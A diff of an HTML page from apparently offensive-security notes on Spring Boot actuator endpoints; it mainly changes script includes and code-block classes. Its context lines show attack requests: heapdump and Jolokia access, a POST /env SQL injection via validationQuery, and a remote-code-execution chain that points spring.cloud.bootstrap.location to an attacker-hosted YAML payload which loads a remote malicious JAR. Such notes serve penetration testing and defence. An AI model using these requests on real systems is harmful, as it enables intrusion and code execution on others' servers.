@@ -19,9 +19,7 @@
     var mkdocs_page_input_path = "spring_boot.md";
     var mkdocs_page_url = "/spring_boot/";
   </script>
-  
-  <script src="../js/jquery-2.1.1.min.js" defer></script>
-  <script src="../js/modernizr-2.8.3.min.js" defer></script> 
+   
 </head>
 
 <body class="ready sticky">
@@ -319,21 +317,21 @@ authentication.</p>
 </ul>
 <p>For instance, it's possible to <a href="https://docs.spring.io/spring-boot/docs/current-SNAPSHOT/actuator-api/html/#heapdump" target="_blank">dump the heap memory</a>
 of the server:</p>
-<pre><code class="language-none line-numbers">https://&lt;host&gt;/path/actuator/heapdump
+<pre><code class="language-none">https://&lt;host&gt;/path/actuator/heapdump
 </code></pre>
 
 <p>A brute-force list can be found here: <a href="../assets/spring_boot.txt">spring_boot.txt</a></p>
 <h2 id="jolokia">Jolokia</h2>
 <p>An other Sping Boot endpoint is <code>jolokia</code>. It allow the user to perform the same
 actions as the JMX.</p>
-<pre><code class="language-none line-numbers">https://&lt;host&gt;/path/jolokia/list
+<pre><code class="language-none">https://&lt;host&gt;/path/jolokia/list
 </code></pre>
 
 <p>It can be used to perform remote code execution.</p>
 <h2 id="env">Env</h2>
 <p>The <code>/env</code> endpoint allows to update the Spring Boot environmental properties.
 It's possible to execute SQL commands:</p>
-<pre><code class="language-none line-numbers">POST /env HTTP/1.1
+<pre><code class="language-none">POST /env HTTP/1.1
 Host: &lt;host&gt;
 Content-Type: application/x-www-form-urlencoded
 Content-Length: 0
@@ -343,7 +341,7 @@ spring.datasource.tomcat.validationQuery=&lt;sql cmd&gt;
 
 <p>Also, it's possible to update the <code>env</code> to execute code with the properties:
 <code>spring.cloud.bootstrap.location</code> which is used to load external configuration file:</p>
-<pre><code class="language-none line-numbers">POST /env HTTP/1.1
+<pre><code class="language-none">POST /env HTTP/1.1
 Host: &lt;host&gt;
 Content-Type: application/x-www-form-urlencoded
 Content-Length: 0
@@ -352,7 +350,7 @@ spring.cloud.bootstrap.location=http://&lt;attacker&gt;/malicious-config-file.ym
 </code></pre>
 
 <p>The malicious configuration file can be:</p>
-<pre><code class="language-none line-numbers">!!javax.script.ScriptEngineManager [
+<pre><code class="language-none">!!javax.script.ScriptEngineManager [
   !!java.net.URLClassLoader [[
     !!java.net.URL [&quot;http://&lt;attacker&gt;/malicious.jar&quot;]
   ]]
@@ -360,7 +358,7 @@ spring.cloud.bootstrap.location=http://&lt;attacker&gt;/malicious-config-file.ym
 </code></pre>
 
 <p>You need to refresh the configuration:</p>
-<pre><code class="language-none line-numbers">POST /refresh HTTP/1.1
+<pre><code class="language-none">POST /refresh HTTP/1.1
 Host: &lt;host&gt;
 Content-Type: application/x-www-form-urlencoded
 Content-Length: 0
@@ -391,18 +389,8 @@ Content-Length: 0
     </span>
 </div>
     <script>var base_url = '..';</script>
-    <script src="../js/theme.js"></script>
-    <script src="../js/prism-core.min.js"></script>
-    <script src="../js/prism-line-numbers.min.js"></script>
-    <script src="../js/prism-clike.min.js"></script>
-    <script src="../js/prism-yaml.min.js"></script>
-    <script src="../js/prism-powershell.min.js"></script>
-    <script src="../js/prism-bash.min.js"></script>
-    <script src="../js/prism-nginx.min.js"></script>
-    <script src="../js/prism-python.min.js"></script>
-    <script src="../js/prism-markup.min.js"></script>
-    <script src="../js/prism-markup-templating.min.js"></script>
-    <script src="../js/prism-php.min.js"></script>
+    <script async src="../js/theme.js"></script>
+    <script async src="../js/prism.min.js"></script>
     <script src="../search/main.js"></script>
     
     <script>
